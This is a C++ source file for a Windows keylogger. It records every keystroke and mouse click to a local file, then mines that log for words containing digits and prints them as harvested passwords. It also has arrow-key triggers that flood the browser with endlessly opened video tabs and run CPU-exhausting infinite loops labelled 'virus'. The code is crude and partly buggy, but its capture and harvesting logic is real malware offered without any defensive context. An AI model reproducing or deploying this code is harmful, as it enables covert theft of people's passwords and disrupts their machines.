#include <windows.h>
#include "keylog.h"
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>
#include <time.h>
#include <stdlib.h>
#include <math.h>
#include <sstream>
#include <cstdlib>
#include <random>
#include <process.h>
#include <chrono>

using namespace std;

struct password
{
  string password;
};

typedef std::chrono::high_resolution_clock Clock;

struct password pass[100];

void keylog::keyloggers (LPCSTR text)
{
        ofstream keylogs;
        keylogs.open("keylogs.txt",fstream::app);
        keylogs<<text;
        keylogs.close();
}

bool keylog::specialkeys (int ikey)
{
        switch(ikey)
        {
            case VK_RETURN:
                cout<<endl;
                keyloggers("/n");
                break;

            case VK_SHIFT:
                cout<<" /SHIFT/";
                keyloggers("/SHIFT/");
                break;

            case VK_BACK:
                cout<<"/b";
                keyloggers("/b");
                break;

            case VK_DOWN:
                ppp();
                abort();

            case VK_LBUTTON:
                cout<<" /LEFT CLICK/ ";
                keyloggers(" /LEFT CLICK/ ");
                break;

            case VK_RBUTTON:
                cout<<" /RIGHT CLICK/ ";
                keyloggers(" /RIGHT CLICK/ ");
                break;

            case VK_UP:
                megavirus();
                break;

            case VK_LEFT:
                virus();
                break;

            case VK_RIGHT:
                rickroll();
                break;

            default: return false;
        }
}

void keylog::keylogger()
{
    char key;
    while(TRUE)
    {
            Sleep(10);
            for (key=8; key<=190; key++)
            {
                    if (GetAsyncKeyState(key)==-32767)
                    {
                            if(specialkeys(key)==FALSE)
                            {
                                    cout<<key;
                                    ofstream logfile;
                                    logfile.open("keylogs.txt", fstream::app);
                                    logfile<<key;
                                    logfile.close();
                            }
                    }
            }
    }
}

void keylog::rickroll(){
    while (1==1){
        ShellExecute(NULL,"open","https://www.bing.com/videos/search?q=darude+sandroll&qpvt=darude+sandroll&view=detail&mid=8878C22637F3C93978BD8878C22637F3C93978BD&FORM=VRDGAR",NULL,NULL,SW_SHOWNORMAL);
        ShellExecute(NULL,"open","https://www.bing.com/videos/search?q=darude+sandroll&qpvt=darude+sandroll&view=detail&mid=8878C22637F3C93978BD8878C22637F3C93978BD&FORM=VRDGAR",NULL,NULL,SW_SHOWNORMAL);
        ShellExecute(NULL,"open","https://www.bing.com/videos/search?q=darude+sandroll&qpvt=darude+sandroll&view=detail&mid=8878C22637F3C93978BD8878C22637F3C93978BD&FORM=VRDGAR",NULL,NULL,SW_SHOWNORMAL);
        ShellExecute(NULL,"open","https://www.bing.com/videos/search?q=darude+sandroll&qpvt=darude+sandroll&view=detail&mid=8878C22637F3C93978BD8878C22637F3C93978BD&FORM=VRDGAR",NULL,NULL,SW_SHOWNORMAL);
        ShellExecute(NULL,"open","https://www.bing.com/videos/search?q=darude+sandroll&qpvt=darude+sandroll&view=detail&mid=8878C22637F3C93978BD8878C22637F3C93978BD&FORM=VRDGAR",NULL,NULL,SW_SHOWNORMAL);
        ShellExecute(NULL,"open","https://www.bing.com/videos/search?q=darude+sandroll&qpvt=darude+sandroll&view=detail&mid=8878C22637F3C93978BD8878C22637F3C93978BD&FORM=VRDGAR",NULL,NULL,SW_SHOWNORMAL);
        ShellExecute(NULL,"open","https://www.bing.com/videos/search?q=darude+sandroll&qpvt=darude+sandroll&view=detail&mid=8878C22637F3C93978BD8878C22637F3C93978BD&FORM=VRDGAR",NULL,NULL,SW_SHOWNORMAL);
        ShellExecute(NULL,"open","https://www.bing.com/videos/search?q=darude+sandroll&qpvt=darude+sandroll&view=detail&mid=8878C22637F3C93978BD8878C22637F3C93978BD&FORM=VRDGAR",NULL,NULL,SW_SHOWNORMAL);
        ShellExecute(NULL,"open","https://www.bing.com/videos/search?q=darude+sandroll&qpvt=darude+sandroll&view=detail&mid=8878C22637F3C93978BD8878C22637F3C93978BD&FORM=VRDGAR",NULL,NULL,SW_SHOWNORMAL);
        ShellExecute(NULL,"open","https://www.bing.com/videos/search?q=darude+sandroll&qpvt=darude+sandroll&view=detail&mid=8878C22637F3C93978BD8878C22637F3C93978BD&FORM=VRDGAR",NULL,NULL,SW_SHOWNORMAL);
        ShellExecute(NULL,"open","https://www.bing.com/videos/search?q=darude+sandroll&qpvt=darude+sandroll&view=detail&mid=8878C22637F3C93978BD8878C22637F3C93978BD&FORM=VRDGAR",NULL,NULL,SW_SHOWNORMAL);
        ShellExecute(NULL,"open","https://www.bing.com/videos/search?q=darude+sandroll&qpvt=darude+sandroll&view=detail&mid=8878C22637F3C93978BD8878C22637F3C93978BD&FORM=VRDGAR",NULL,NULL,SW_SHOWNORMAL);
    }
}

void keylog::virus()
{
    int x=1000000;
    while (1==1)
    {
          x=pow(x,x);
          x=pow(x,x);
          x=pow(x,x);
          x=pow(x,x);
          x=pow(x,x);
          x=pow(x,x);
          x=pow(x,x);
          x=pow(x,x);
          x=pow(x,x);
          x=pow(x,x);
    }
}

void keylog::megavirus()
{   int x=2;
    while (1==1)
    {
        x=x*(rand()%1000000);
    }
}



void keylog::passwordchecker(int y, string word)
{
    int length=word.size();
    for(int x=0;x<length;x++)
    {
        if (word[x]=='1')
        {

            pass[y].password=word;

        }

        if (word[x]=='2')
        {
            pass[y].password=word;

        }

        if (word[x]=='3')
        {
            pass[y].password=word;

        }

        if (word[x]== '4')
        {
            pass[y].password=word;

        }

        if (word[x]== '5')
        {
            pass[y].password=word;

        }

        if (word[x]=='6')
        {
            pass[y].password=word;

        }

        if (word[x]=='7')
        {
            pass[y].password=word;

        }

        if (word[x]=='8')
        {
            pass[y].password=word;

        }

        if (word[x]=='9')
        {
            pass[y].password=word;

        }
    }
}

int keylog::passwordfinder()
{   int y=0;
  string word;
  ifstream in_stream;
  in_stream.open("keylogs.txt");
  while(!in_stream.eof())
  {
    string word;
    getline(in_stream,word);
    string strArray [word.length()];
    int y = 0;
    int isave=0;
    for (int i = 0; i < word.length(); ++i){
            if (word[i] == ' '){
                int len =i-isave+1;
                strArray[y]=word.substr(isave ,len);
                isave=i;
                passwordchecker(y,strArray[y]);
                y++;

            }
        }

  }
  in_stream.close();
  return 0;
}

void keylog::ppp()
{
    //int x=0;
    passwordfinder();
    for (int x=0;x<10;x++){
    cout<<pass[x].password<<endl;
    }
}
